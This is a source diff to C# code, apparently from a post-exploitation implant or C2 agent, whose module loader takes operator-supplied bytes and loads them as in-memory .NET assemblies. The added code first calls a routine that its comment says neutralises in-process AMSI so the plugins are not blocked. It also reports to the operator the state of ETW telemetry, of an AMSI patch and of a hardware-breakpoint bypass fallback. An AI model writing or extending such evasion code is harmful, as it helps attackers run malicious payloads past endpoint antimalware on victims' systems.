@@ -7,6 +7,7 @@ using System.Diagnostics;
 using System.IO;
 using System.Net;
 using System.Reflection;
+using System.Runtime.InteropServices;
 using System.Security.AccessControl;
 using System.Security.Principal;
 using System.Text;
@@ -388,6 +389,11 @@ namespace Nx
 
 		public static byte[] Load(LY h)
 		{
+			// Neutralise in-process AMSI first: with it live the CLR refuses every
+			// Assembly.Load below with BadImageFormatException / 0x800700E1 and no
+			// plugin loads. The outcome is carried back on failure, so a patch that
+			// never landed cannot be mistaken for a blocked module.
+			Amsi.Ensure();
 			byte[] bin = Top.B(h, "binCode");
 			string name = Top.S(h, "codeName");
 			string asn = Top.S(h, "assemblyName");
@@ -409,19 +415,43 @@ namespace Nx
 							h.ctx[name] = a;
 							return Top.Tb("ok");
 						}
-						return Top.Tb("module missing");
+						return Top.Tb(Why("module missing", name, bin, null));
 					}
 					catch (Exception ex)
 					{
-						return Top.Tb(ex.Message);
+						return Top.Tb(Why(ex.Message, name, bin, ex));
 					}
 				}
-				return Top.Tb("missing module fields");
+				return Top.Tb("missing module fields: binCode=" + (bin == null ? "null" : bin.Length.ToString()) + " codeName=" + (name == null ? "null" : name));
 			}
 			catch (Exception ex2)
 			{
 				return Top.Tb(ex2.Message);
 			}
+		}
+
+		private static string Why(string msg, string name, byte[] bin, Exception ex)
+		{
+			string s = msg;
+			s += "\n[load] codeName=" + name + " binCode=" + (bin == null ? "null" : bin.Length.ToString()) + " bytes";
+			s += "\n[load] telemetry=" + Etw.Status();
+			s += "\n[load] amsi=" + Amsi.Status();
+			if ("patch".Equals(Amsi.Status()))
+			{
+				// the fallback is in use, not the preferred mechanism: carry the
+				// reason so a silent demotion is visible
+				s += "\n[load] breakpoint=" + Hwbp.LastError();
+			}
+			if (ex != null)
+			{
+				s += "\n[load] type=" + ex.GetType().FullName;
+				s += "\n[load] hresult=0x" + ((uint)Marshal.GetHRForException(ex)).ToString("X8");
+				if (ex.InnerException != null)
+				{
+					s += "\n[load] inner=" + ex.InnerException.GetType().FullName + ": " + ex.InnerException.Message;
+				}
+			}
+			return s;
 		}
 
 		public static byte[] Exec(LY h)
